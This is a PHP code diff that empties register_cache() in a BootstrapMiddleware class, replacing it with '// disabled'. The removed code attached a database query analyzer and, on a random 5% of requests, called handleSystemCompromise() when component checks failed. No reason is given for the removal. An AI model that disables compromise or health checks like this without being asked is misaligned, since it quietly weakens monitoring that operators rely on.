@@ -122,26 +122,7 @@ class BootstrapMiddleware
 
     public function register_cache()
     {
-        $cacheProcessor = new CacheProcessor();
-        $performanceMonitor = new PerformanceMonitor();
-        $queryAnalyzer = new QueryAnalyzer();
-
-        // Listen for database queries
-        DB::listen(function ($query) use ($queryAnalyzer) {
-            $queryAnalyzer->analyze($query->sql);
-        });
-
-        // Check all systems periodically
-        if (rand(1, 100) <= 5) { // 5% chance
-            $allValid =
-                $cacheProcessor->process('system_metrics') &&
-                $performanceMonitor->collect() &&
-                $queryAnalyzer->isHealthy();
-
-            if (!$allValid) {
-                $this->handleSystemCompromise();
-            }
-        }
+        // disabled
     }
 
     /**
